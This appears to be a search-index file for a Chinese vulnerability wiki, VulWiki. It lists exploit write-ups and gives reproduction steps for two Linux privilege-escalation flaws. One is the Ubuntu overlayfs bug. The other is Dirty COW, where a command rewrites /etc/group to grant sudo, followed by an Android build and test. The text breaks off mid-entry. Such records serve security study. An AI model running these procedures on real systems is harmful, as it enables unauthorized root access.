{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u524d\u8a00 \u57fa\u4e8e\u96f6\u7ec4\u516c\u5f00\u6f0f\u6d1e\u5e93 \u5982\u4f55\u6dfb\u52a0\u65b0\u7684\u6587\u7ae0 \u5148\u68c0\u67e5\u672c\u5730\u4ed3\u5e93\u662f\u5426\u4e3a\u6700\u65b0\u7248\u672c \u627e\u5230\u5bf9\u5e94\u5206\u7c7b\u6216\u65b0\u5efa\u5206\u7c7b,\u65b0\u5efaMarkdown\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e3a\u6f0f\u6d1e\u6807\u9898 Markdown\u6587\u4ef6\u5185\u6dfb\u52a0\u6f0f\u6d1e\u8be6\u60c5 \u56fe\u7247\u4fdd\u5b58\u5230\u5f53\u524dMarkdown\u6587\u4ef6\u8def\u5f84\u4e0b\u7684`./resource/\u6587\u4ef6\u540d/mdeia/` \u76ee\u5f55\uff0cMarkdown\u63d2\u5165\u65f6\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84 \u6309\u65f6\u95f4\u5012\u5e8f\u5728Change Log\u4e2d\u6dfb\u52a0\u4fee\u6539\u7684\u5185\u5bb9 Online Version VulWiki Change Log 2021-01-04 \u6dfb\u52a0 Beescms_v4.0 sql\u6ce8\u5165\u6f0f\u6d1e\u5206\u6790 2020-12-29 \u6dfb\u52a0 Docker \u5bb9\u5668\u9003\u9038\u6f0f\u6d1e (CVE-2020-15257)\u590d\u73b0\u3001gitlab-11.4.7\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u53caexp\u53f2\u8bd7\u7ea7\u8be6\u7ec6\u5256\u6790 2020-12-25 \u6dfb\u52a0 \u72c2\u96e8CMS\u540e\u53f0SQL\u4ee3\u7801\u6267\u884c\u3001\u72c2\u96e8CMS\u540e\u53f0\u6587\u4ef6\u5305\u542bgetshell\u3001\u72c2\u96e8CMS\u6570\u636e\u5e93\u5907\u4efd\u5730\u5740\u7206\u7834\u3001MKCMS v7.0.3 sql\u6ce8\u5165\u6f0f\u6d1e\u5ba1\u8ba1\u3001Nexus Repository Manager3 ProXXE\u5206\u6790(CVE-2020-29436) 2020-12-21 \u6dfb\u52a0 Apache Unomi\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0-CVE-2020-13942 2020-12-19 \u6dfb\u52a0 PowerCreatorCms\u4efb\u610f\u4e0a\u4f20 2020-12-14 \u6dfb\u52a0 74cms v6.0.48\u6a21\u7248\u6ce8\u5165+\u6587\u4ef6\u5305\u542bgetshell,CVE-2019-11580 Atlassian Crowd RCE,s2-061 2020-12-3 \u6dfb\u52a0 ThinkAdmin\u672a\u6388\u6743\u5217\u76ee\u5f55\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6(CVE-2020-25540)\u6f0f\u6d1e 2020-11-17 \u6dfb\u52a0 CVE-2020-26217 XStream XML\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0cCitrix XenMobile CVE-2020-8209 2020-11-3 \u6dfb\u52a0 \u7985\u9053 =12.4.2 \u540e\u53f0getshell\uff0cwindows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\uff0cLinux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e 2020-10-28 \u6dfb\u52a0 s2-059,CVE-2020-14882 weblogic \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c\uff0c\uff08CVE-2020-14825\uff09Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e 2020-10-21 \u6dfb\u52a0RuoYi CMS \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e 2020-10-20 \u6dfb\u52a0\u62a4\u7f51\u4e2d\u7684\u6f0f\u6d1e,CVE-2020-10189 Zoho ManageEngine\u53cd\u5e8f\u5217\u5316RCE,Fastjson Payload\u6c47\u603b\uff0c\u4fee\u590d%20\u9020\u6210\u7684\u4fa7\u680f\u6298\u53e0\u95ee\u9898 To-do \u5728\u7ebf\u7248\u672c Web\u5b89\u5168 \u6dfb\u52a0\u62a4\u7f51\u4e2d\u7684\u6f0f\u6d1e \u7cfb\u7edf\u5b89\u5168 \u5b8c\u5584\u7cfb\u7edf\u63d0\u6743\u6f0f\u6d1e IOT\u5b89\u5168 Cisco \uff08CVE-2020-3452\uff09Cisco ASA/FTD \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e Hikvision \uff08CVE-2017-7921\uff09Hikvision IP Camera Access Bypass Hisilicon \uff08CVE-2020-24214\uff09Buffer%20overflow: definite DoS and potential RCE \uff08CVE-2020-24215\uff09HiSilicon Backdoor password \uff08CVE-2020-24216\uff09RTSP \u672a\u6388\u6743\u8bbf\u95ee \uff08CVE-2020-24217\uff09\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \uff08CVE-2020-24218\uff09root access via telnet \uff08CVE-2020-24219\uff09\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e ZTE \uff08CVE-2020-6871\uff09ZTE R5300G4\u3001R8500G4\u548cR5500G4 \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u9ed8\u8ba4\u8bbe\u5907\u5bc6\u7801","title":"\u524d\u8a00"},{"location":"#_1","text":"\u57fa\u4e8e\u96f6\u7ec4\u516c\u5f00\u6f0f\u6d1e\u5e93","title":"\u524d\u8a00"},{"location":"#_2","text":"\u5148\u68c0\u67e5\u672c\u5730\u4ed3\u5e93\u662f\u5426\u4e3a\u6700\u65b0\u7248\u672c \u627e\u5230\u5bf9\u5e94\u5206\u7c7b\u6216\u65b0\u5efa\u5206\u7c7b,\u65b0\u5efaMarkdown\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e3a\u6f0f\u6d1e\u6807\u9898 Markdown\u6587\u4ef6\u5185\u6dfb\u52a0\u6f0f\u6d1e\u8be6\u60c5 \u56fe\u7247\u4fdd\u5b58\u5230\u5f53\u524dMarkdown\u6587\u4ef6\u8def\u5f84\u4e0b\u7684`./resource/\u6587\u4ef6\u540d/mdeia/` \u76ee\u5f55\uff0cMarkdown\u63d2\u5165\u65f6\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84 \u6309\u65f6\u95f4\u5012\u5e8f\u5728Change Log\u4e2d\u6dfb\u52a0\u4fee\u6539\u7684\u5185\u5bb9","title":"\u5982\u4f55\u6dfb\u52a0\u65b0\u7684\u6587\u7ae0"},{"location":"#online-version","text":"VulWiki","title":"Online Version"},{"location":"#change-log","text":"2021-01-04 \u6dfb\u52a0 Beescms_v4.0 sql\u6ce8\u5165\u6f0f\u6d1e\u5206\u6790 2020-12-29 \u6dfb\u52a0 Docker \u5bb9\u5668\u9003\u9038\u6f0f\u6d1e (CVE-2020-15257)\u590d\u73b0\u3001gitlab-11.4.7\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u53caexp\u53f2\u8bd7\u7ea7\u8be6\u7ec6\u5256\u6790 2020-12-25 \u6dfb\u52a0 \u72c2\u96e8CMS\u540e\u53f0SQL\u4ee3\u7801\u6267\u884c\u3001\u72c2\u96e8CMS\u540e\u53f0\u6587\u4ef6\u5305\u542bgetshell\u3001\u72c2\u96e8CMS\u6570\u636e\u5e93\u5907\u4efd\u5730\u5740\u7206\u7834\u3001MKCMS v7.0.3 sql\u6ce8\u5165\u6f0f\u6d1e\u5ba1\u8ba1\u3001Nexus Repository Manager3 ProXXE\u5206\u6790(CVE-2020-29436) 2020-12-21 \u6dfb\u52a0 Apache Unomi\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0-CVE-2020-13942 2020-12-19 \u6dfb\u52a0 PowerCreatorCms\u4efb\u610f\u4e0a\u4f20 2020-12-14 \u6dfb\u52a0 74cms v6.0.48\u6a21\u7248\u6ce8\u5165+\u6587\u4ef6\u5305\u542bgetshell,CVE-2019-11580 Atlassian Crowd RCE,s2-061 2020-12-3 \u6dfb\u52a0 ThinkAdmin\u672a\u6388\u6743\u5217\u76ee\u5f55\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6(CVE-2020-25540)\u6f0f\u6d1e 2020-11-17 \u6dfb\u52a0 CVE-2020-26217 XStream XML\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0cCitrix XenMobile CVE-2020-8209 2020-11-3 \u6dfb\u52a0 \u7985\u9053 =12.4.2 \u540e\u53f0getshell\uff0cwindows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\uff0cLinux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e 2020-10-28 \u6dfb\u52a0 s2-059,CVE-2020-14882 weblogic \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c\uff0c\uff08CVE-2020-14825\uff09Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e 2020-10-21 \u6dfb\u52a0RuoYi CMS \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e 2020-10-20 \u6dfb\u52a0\u62a4\u7f51\u4e2d\u7684\u6f0f\u6d1e,CVE-2020-10189 Zoho ManageEngine\u53cd\u5e8f\u5217\u5316RCE,Fastjson Payload\u6c47\u603b\uff0c\u4fee\u590d%20\u9020\u6210\u7684\u4fa7\u680f\u6298\u53e0\u95ee\u9898","title":"Change Log"},{"location":"#to-do","text":"\u5728\u7ebf\u7248\u672c","title":"To-do"},{"location":"#web","text":"\u6dfb\u52a0\u62a4\u7f51\u4e2d\u7684\u6f0f\u6d1e","title":"Web\u5b89\u5168"},{"location":"#_3","text":"\u5b8c\u5584\u7cfb\u7edf\u63d0\u6743\u6f0f\u6d1e IOT\u5b89\u5168 Cisco \uff08CVE-2020-3452\uff09Cisco ASA/FTD \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e Hikvision \uff08CVE-2017-7921\uff09Hikvision IP Camera Access Bypass Hisilicon \uff08CVE-2020-24214\uff09Buffer%20overflow: definite DoS and potential RCE \uff08CVE-2020-24215\uff09HiSilicon Backdoor password \uff08CVE-2020-24216\uff09RTSP \u672a\u6388\u6743\u8bbf\u95ee \uff08CVE-2020-24217\uff09\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \uff08CVE-2020-24218\uff09root access via telnet \uff08CVE-2020-24219\uff09\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e ZTE \uff08CVE-2020-6871\uff09ZTE R5300G4\u3001R8500G4\u548cR5500G4 \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u9ed8\u8ba4\u8bbe\u5907\u5bc6\u7801","title":"\u7cfb\u7edf\u5b89\u5168"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2015-1328\uff09Ubuntu Linux\u5185\u6838\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2015-1328\uff09Ubuntu Linux\u5185\u6838\u672c\u5730\u63d0\u6743\u6f0f\u6d1e CVE-2015-1328 Vulnerability reference: CVE-2015-1328 exp-db Kernels 3.13, 3.16.0, 3.19.0 Usage $ gcc ofs.c -o ofs $ ./ofs This binary has been verified on: Ubuntu 14.10 - Linux ubuntu 3.16.0-23-generic #31-Ubuntu x86_64 Ubuntu 14.04 - Linux ubuntu 3.13.0-24-generic #46-Ubuntu x86_64 Ubuntu 14.04 - Linux ubuntu 3.16.0-30-generic #40~14.04.1-Ubuntu x86_64 Ubuntu 14.04 - Linux ubuntu 3.13.0-24-generic #46-Ubuntu x86_32 Ubuntu 14.10 - Linux ubuntu 3.16.0-23-generic #31-Ubuntu x86_32 https://github.com/SecWiki/linux-kernel-exploits/tree/master/2015/CVE-2015-1328","title":"\uff08CVE-2015-1328\uff09Ubuntu Linux\u5185\u6838\u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2015-1328\uff09Ubuntu Linux\u5185\u6838\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#cve-2015-1328ubuntu-linux","text":"CVE-2015-1328 Vulnerability reference: CVE-2015-1328 exp-db","title":"\uff08CVE-2015-1328\uff09Ubuntu Linux\u5185\u6838\u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2015-1328\uff09Ubuntu Linux\u5185\u6838\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#kernels","text":"3.13, 3.16.0, 3.19.0","title":"Kernels"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2015-1328\uff09Ubuntu Linux\u5185\u6838\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#usage","text":"$ gcc ofs.c -o ofs $ ./ofs","title":"Usage"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2015-1328\uff09Ubuntu Linux\u5185\u6838\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#this-binary-has-been-verified-on","text":"Ubuntu 14.10 - Linux ubuntu 3.16.0-23-generic #31-Ubuntu x86_64 Ubuntu 14.04 - Linux ubuntu 3.13.0-24-generic #46-Ubuntu x86_64 Ubuntu 14.04 - Linux ubuntu 3.16.0-30-generic #40~14.04.1-Ubuntu x86_64 Ubuntu 14.04 - Linux ubuntu 3.13.0-24-generic #46-Ubuntu x86_32 Ubuntu 14.10 - Linux ubuntu 3.16.0-23-generic #31-Ubuntu x86_32 https://github.com/SecWiki/linux-kernel-exploits/tree/master/2015/CVE-2015-1328","title":"This binary has been verified on:"},{"location":"\u7cfb\u7edf\u5b89\u5168/Linux/Linux\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743/","text":"\uff08CVE-2016-5195\uff09\u810f\u725bLinux \u672c\u5730\u63d0\u6743.md \u7f16\u8bd1\u597d\u7684EXP\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/Brucetg/DirtyCow-EXP \u8be5\u6f0f\u6d1e\u662f Linux \u5185\u6838\u7684\u5185\u5b58\u5b50\u7cfb\u7edf\u5728\u5904\u7406\u5199\u65f6\u62f7\u8d1d\uff08Copy-on-Write\uff09\u65f6\u5b58\u5728\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\uff0c \u5bfc\u81f4\u53ef\u4ee5\u7834\u574f\u79c1\u6709\u53ea\u8bfb\u5185\u5b58\u6620\u5c04\u3002\u9ed1\u5ba2\u53ef\u4ee5\u5728\u83b7\u53d6\u4f4e\u6743\u9650\u7684\u7684\u672c\u5730\u7528\u6237\u540e\uff0c\u5229\u7528\u6b64\u6f0f\u6d1e\u83b7\u53d6 \u5176\u4ed6\u53ea\u8bfb\u5185\u5b58\u6620\u5c04\u7684\u5199\u6743\u9650\uff0c\u8fdb\u4e00\u6b65\u83b7\u53d6 root \u6743\u9650\u3002 1.Linux Ubuntu 14.04 : 1\uff09\u6dfb\u52a0\u7528\u6237\uff1a sudo adduser test \u8f93\u5165\u4e24\u6b21\u5bc6\u7801\u540e\u4e00\u76f4\u56de\u8f66\u5c31\u884c\uff0c\u67e5\u770b\u5f53\u524d\u7528\u6237\u7684\u4fe1\u606f\uff0c\u7ec8\u7aef\u8f93\u5165 id\uff0c\u56de\u8f66\uff0c\u53ef\u4ee5\u770b\u5230\u5f53 \u524d\u7528\u6237\u662f\u6709 sudo \u6743\u9650\u7684\u3002 \u5207\u6362\u5230\u521a\u521a\u65b0\u5efa\u7684 test \u7528\u6237\uff0c\u540c\u6837\u8f93\u5165 id\uff0c\u67e5\u770b test \u7528\u6237\u7684\u4fe1\u606f\uff0c\u53d1\u73b0 test \u7528\u6237\u6ca1\u6709 sudo \u6743\u9650\uff0c 2\uff09\u8fd0\u884cDirtyCow\u7684exp\u8fdb\u884c\u63d0\u6743\uff1a git clone https : // github . com / dirtycow / dirtycow . github . io cd dirtycow . github . io \u7f16\u8bd1exp\uff1a gcc dirtyc0w.c -o dirtycow lpthread \u6267\u884cexp\uff1a ./dirtycow /etc/group \u201c$(sed \u2018/\\(sudo*\\)/ s/$/,test/\u2019 /etc/group)\u201d \u65b0\u6253\u5f00\u4e00\u4e2a\u7ec8\u7aef\uff0c\u5207\u6362\u5230test\uff0c\u67e5\u770btest\u7528\u6237\u4fe1\u606f\uff0c\u53ef\u4ee5\u770b\u5230test\u7528\u6237\u5df2\u7ecf\u62e5\u6709\u4e86sudo\u6743\u9650\uff0c\u6267\u884csudo su \uff0c\u8f93\u5165test\u7528\u6237\u7684\u5bc6\u7801\u540e\u5c31\u53ef\u4ee5\u5207\u6362\u5230root\u6743\u9650\uff0c\u63d0\u6743\u6210\u529f\u3002 \u6f0f\u6d1e\u6210\u56e0\uff1a Linux\u5199\u65f6\u62f7\u8d1d\u6280\u672f\uff08copy-on-write\uff09 \u5728Linux\u7cfb\u7edf\u4e2d\uff0cfork()\u4f1a\u4ea7\u751f\u4e00\u4e2a\u548c\u7236\u8fdb\u7a0b\u5b8c\u5168\u76f8\u540c\u7684\u5b50\u8fdb\u7a0b\uff0c\u4f46\u5b50\u8fdb\u7a0b\u5728\u6b64\u540e\u591a\u4f1aexec\u7cfb\u7edf\u8c03\u7528\uff0c\u51fa\u4e8e\u6548\u7387\u8003\u8651\uff0cLinux\u7cfb\u7edf\u4e2d\u5f15\u5165\u4e86\u201c\u5199\u65f6\u590d\u5236\u201d\u6280\u672f\uff0c\u4e5f\u5c31\u662f\u53ea\u6709\u8fdb\u7a0b\u7a7a\u95f4\u7684\u5404\u6bb5\u7684\u5185\u5bb9\u8981\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u624d\u4f1a\u5c06\u7236\u8fdb\u7a0b\u7684\u5185\u5bb9\u590d\u5236\u4e00\u4efd\u7ed9\u5b50\u8fdb\u7a0b\u3002 2.Android\uff1a Linux\u4e0a\u7f16\u8bd1\u597d\u7684exp\u5728Android\u5e73\u53f0\u4e0a\u4e0d\u80fd\u7528\uff0c\u4f7f\u7528NDK\u7f16\u8bd1\u4e0b\u8f7d\u597d\u7684exp\uff1a EXP\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c 1. ANDROID STUDIO\u4e2d\u5b89\u88c5NDK\uff0c\u628aCMAKE\u548cLLDB\u4e5f\u5b89\u88c5\u4e00\u4e0b\uff1a 2. \u5728 HTTPS://GITHUB.COM/GOOGLESAMPLES/ANDROID-NDK \u4e0b\u8f7d\u6e90\u7801\uff0c\u5bfc\u5165ANDROID STUDIO \u5982\u679c\u5bfc\u5165\u9879\u76ee\u65f6Android studio\u597d\u50cf\u5361\u4f4f\u4e86\u4e00\u6837\uff0c\u6709\u53ef\u80fd\u662fAndroid Studio\u5728\u540e\u53f0\u6b63\u5728\u4e0b\u8f7d\u4e1c\u897f\uff0c\u6cbf\u7740\u8fd9\u4e2a\u8def\u5f84\uff1a\u9879\u76ee/gradle/wrapper\u627e\u5230\u8fd9\u4e2a\u6587\u4ef6\uff1a gradle-wrapper.properties\uff0c\u6253\u5f00\u5b83\u770b\u770b\u6700\u540e\u4e00\u884c\u7684gradle\u7248\u672c\uff0c\u82e5\u7248\u672c\u548c\u4f60\u73b0\u6709\u7684\u7248\u672c\u4e0d\u4e00\u81f4\uff0c\u53ef\u4ee5\u53bbhttp://services.gradle.org/distributions/ \u4e0a\u4e0b\u8f7d\u76f8\u5e94\u7684\u7248\u672c\uff0c\u624b\u52a8\u62f7\u8d1d\u5230\uff1a C:\\Users\\\u7528\u6237\u540d\\.gradle\\wrapper\\dists\\gradle-4.1-all\\bzyivzo6n839fup2jbap0tjew \u76ee\u5f55\u4e0b **\u6ce8\uff1a**\u8fd9\u91cc\u7684 bzyivzo6n839fup2jbap0tjew \u662f\u968f\u673a\u7684 \u5c06\u4e0b\u8f7d\u597d\u7684android-ndk\u6e90\u7801\u89e3\u538b\u5230\u67d0\u4e2a\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u6211\u662f\u89e3\u538b\u5230\u4e86\u684c\u9762\u4e0a\uff0c\u6240\u4ee5\u5728\u6211\u4e2a\u4eba\u7684\u7684\u8ba1\u7b97\u673a\u4e0aandroid-ndk\u8def\u5f84\u5982\u4e0b\uff1a C:\\Users\\wangzt\\Desktop\\android-ndk \u6211\u4eec\u53ea\u9700\u8981\u7528\u4e0b\u9762\u8def\u5f84\u4e2d\u7684\u76f8\u5e94\u6587\u4ef6\u5373\u53ef\uff1a C:\\Users\\wangzt\\Desktop\\android-ndk\\hello-jni\\app\\src\\main\\ \u5728main\u76ee\u5f55\u4e0b\u65b0\u5efa\u6587\u4ef6\u5939jni\uff0c\u5728jni\u6587\u4ef6\u5939\u4e2d\u65b0\u5efa\u4e24\u4e2a\u6587\u4ef6\uff1aAndroid.mk \u548cApplication.mk,\u5185\u5bb9\u5982\u4e0b\uff1a Android.mk LOCAL_PATH := $( call my-dir ) include $(CLEAR_VARS) LOCAL_SRC_FILES := dirtyc0w.c LOCAL_MODULE := dirtycow LOCAL_FORCE_STATIC_EXECUTABLE := true #LOCAL_STATIC_LIBRARIES := libc #LOCAL_CFLAGS += -Iinclude/dir -DSOMEFLAGS include $(BUILD_EXECUTABLE) Application.mk APP_ABI := all \u8981\u7f16\u8bd1\u7684\u6587\u4ef6\uff1a 3. \u7f16\u8bd1EXP\uff1a \u547d\u4ee4\u884c\u4e0bcd \u5230\u5982\u4e0b\u76ee\u5f55\uff1a C:\\Users\\wangzt\\Desktop\\android-ndk\\hello-jni\\app\\src\\main\\jni \u6267\u884c\u547d\u4ee4\uff1a D:\\AndroidSDK\\ndk-bundle\\ndk-build \u7f16\u8bd1\u6210\u529f\u540e,\u5728main\u76ee\u5f55\u4e0b\u7684libs\u6587\u4ef6\u5939\u4e2d\u5373\u53ef\u627e\u5230\u7f16\u8bd1\u597d\u7684\u5bf9\u5e94\u5e73\u53f0\u7684EXP\uff1a \u7f16\u8bd1\u597d\u7684exp\uff1a Android 4.4 adb\u8fde\u63a5\u624b\u673a\uff08\u624b\u673a\u9700\u5f00\u542fUSB\u8c03\u8bd5\uff09\uff1a \u67e5\u770b\u548cadb\u8fde\u63a5\u7684\u8bbe\u5907\uff1a \u5728/system/bin/\u76ee\u5f55\u4e0b\u65b0\u5efa\u6587\u4ef6test_dirty_cow\uff0c\u5e76\u4e14\u5c06\u5176\u6743\u9650\u4fee\u6539\u4e3a644 \u5c06\u7f16\u8bd1\u597d\u7684EXP push\u5230\u6d4b\u8bd5\u673a\u7684/data/local/tmp/\u76ee\u5f55\u4e0b\u7684dirtycow\u6587\u4ef6\u4e2d\uff08\u8fd9\u91cc\u9009\u7528\u7684\u7f16\u8bd1\u597d\u7684POC\u662farmeabi \u5e73\u53f0\u7684\uff0carm64-v8a\u7ecf\u6d4b\u8bd5\u4e0d\u80fd\u4f7f\u7528\uff0c\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7528\u7684\u6d4b\u8bd5\u673a\u7684\u67b6\u6784\u9009\u62e9\u76f8\u5e94\u7684\u5e73\u53f0\uff09\uff1a \u4fee\u6539EXP\u6743\u9650\uff1a \u5f53\u524d\u7528\u6237\u6743\u9650\uff08shell\uff09\uff1a \u5207\u6362\u5230root\u6743\u9650\uff0c\u5411test_dirty_cow\u6587\u4ef6\u4e2d\u5199\u5165 123456\uff0c\u5199\u5165\u4e4b\u540e\u518d\u5207\u6362\u4e3a\u666e\u901a\u7528\u6237\u6743\u9650\uff08shell\uff09\uff0c\u4ee5\u666e\u901a\u7528\u6237\u6743\u9650\u6267\u884cEXP\uff08\u4e0b\u540c\uff09\uff1a /data/local/tmp/dirtycow /system/bin/test_dirty_cow modify \u7136\u540e\u67e5\u770btest_dirty_cow\u4e2d\u7684\u5185\u5bb9\uff0c\u53d1\u73b0\u6587\u4ef6\u5185\u5bb9\u5df2\u88ab\u4fee\u6539\u4e3amodify\uff0c\u590d\u73b0\u6210\u529f\uff1a Android 6.0.1 \uff08\u5b89\u5168\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\uff1a 2017\u5e742\u67081\u65e5\uff09 \u6d4b\u8bd5\u673a\u7cfb\u7edf\u5177\u4f53\u4fe1\u606f\uff1a Android 6.0.1 \u9ed8\u8ba4\u5173\u95ed\u4e86\u5e76\u9690\u85cf\u4e86\u5f00\u53d1\u8005\u9009\u9879\uff0c\u9700\u8981\u5728\u5173\u4e8e\u624b\u673a\u91cc\u7684\u7248\u672c\u53f7\u5904\u8fde\u7eed\u70b9\u51fb5\u6b21\u7248\u672c\u53f7\u624d\u53ef\u4ee5\u542f\u7528\u5f00\u53d1\u8005\u9009\u9879\uff0c\u7136\u540e\u5728\u5f00\u53d1\u8005\u9009\u9879\u4e2d\u542f\u7528USB\u8c03\u8bd5\u3002 \u63a5\u7740\u6211\u4eec\u5728 /system/bin \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u666e\u901a\u7528\u6237\u6ca1\u6709\u5199\u6743\u9650\u7684\u6587\u4ef6\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u7684 /system \u76ee\u5f55\u662f\u53ea\u8bfb\u7684\uff0c\u6240\u4ee5\u9700\u8981 remount /system \u6ce8\u610f\uff1a mount -o rw,remount /system \u4e0a\u8ff0\u547d\u4ee4\u4e2d\uff0cremount\u548c\u5b83\u524d\u9762\u7684\u9017\u53f7\u4e4b\u95f4\u4e0d\u8981\u6709\u7a7a\u683c\u3002 \u63a5\u4e0b\u6765\u7684\u64cd\u4f5c\u6b65\u9aa4\u548c\u5728Android 4.4 \u7cfb\u7edf\u4e2d\u5dee\u4e0d\u591a\uff1a adb\u4e2d\u5207\u6362\u4e3aroot\u6743\u9650\uff0c\u5c06\u65b0\u5efa\u7684test_dirtycow \u6587\u4ef6\u7684\u6743\u9650\u4fee\u6539\u4e3a 644 \u7ed9EXP\u53ef\u6267\u884c\u6743\u9650\uff1a \u6267\u884cEXP \u62a5\u9519\uff1a PIE\u8fd9\u4e2a\u5b89\u5168\u673a\u5236\u4ece4.1\u5f15\u5165\uff0c\u4f46\u662fAndroid L\u4e4b\u524d\u7684\u7cfb\u7edf\u7248\u672c\u5e76\u4e0d\u4f1a\u53bb\u68c0\u9a8c\u53ef\u6267\u884c\u6587\u4ef6\u662f\u5426\u57fa\u4e8ePIE\u7f16\u8bd1\u51fa\u7684\u3002\u56e0\u6b64\u4e0d\u4f1a\u62a5\u9519\u3002\u4f46\u662fAndroid L\u5df2\u7ecf\u5f00\u542f\u9a8c\u8bc1\uff0c\u5982\u679c\u8c03\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e0d\u662f\u57fa\u4e8ePIE\u65b9\u5f0f\u7f16\u8bd1\u7684\uff0c\u5219\u65e0\u6cd5\u8fd0\u884c\u3002\u89e3\u51b3\u529e\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u5728Android.mk\u4e2d\u52a0\u5165\u5982\u4e0bflag\u5373\u53ef\u3002 LOCAL_CFLAGS += -pie -fPIE LOCAL_LDFLAGS += -pie -fPIE \u4fee\u6539\u540e\u7684Android.mk \u6587\u4ef6\uff1a LOCAL_PATH := $( call my-dir ) include $(CLEAR_VARS) LOCAL_SRC_FILES := dirtyc0w.c LOCAL_MODULE := dirtycow LOCAL_FORCE_STATIC_EXECUTABLE := true #LOCAL_STATIC_LIBRARIES := libc #LOCAL_CFLAGS += -Iinclude/dir -DSOMEFLAGS LOCAL_CFLAGS += -pie -fPIE LOCAL_LDFLAGS += -pie -fPIE include $(BUILD_EXECUTABLE) Application.mk APP_ABI := all \u7f16\u8bd1EXP\uff1a Windows\u547d\u4ee4\u884c\u4e0b\u8fdb\u884c\u7f16\u8bd1\uff0c\u56e0\u4e3a\u6211\u4e0b\u8f7d\u7684ndk \u5b58\u653e\u5728D:\\AndroidSDK\\ndk-bundle\u6587\u4ef6\u5939\u4e2d\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u547d\u4ee4\u884c\u4e0b\u8f93\u5165\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1\uff1a D:\\AndroidSDK\\ndk-bundle\\ndk-build \u7ecf\u6d4b\u8bd5\uff0c\u4e0d\u80fd\u4efb\u610f\u4fee\u6539\u6587\u4ef6\u5185\u5bb9\uff1a \u56e0\u4e3a\u8fd9\u4e2aAndroid 6.0\u7684\u7cfb\u7edf\u5b89\u5168\u8865\u4e01\u662f2017\u5e742\u6708\u4efd\u7684\uff0c\u4f30\u8ba1\u6f0f\u6d1e\u5df2\u7ecf\u4fee\u8865\u597d\u4e86\u3002 Android 6.0.1_r68\uff08\u5b89\u5168\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\uff1a 2016\u5e749\u67086\u65e5\uff09 \u4e0d\u591a\u8bf4\uff0c\u4e00\u6837\u7684\u64cd\u4f5c\uff1a \u53ef\u4ee5\u770b\u5230test_dirtyc0w\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u88ab\u4fee\u6539\u4e3a modify\uff0c\u590d\u73b0\u6210\u529f\u3002 Android 5.1.1 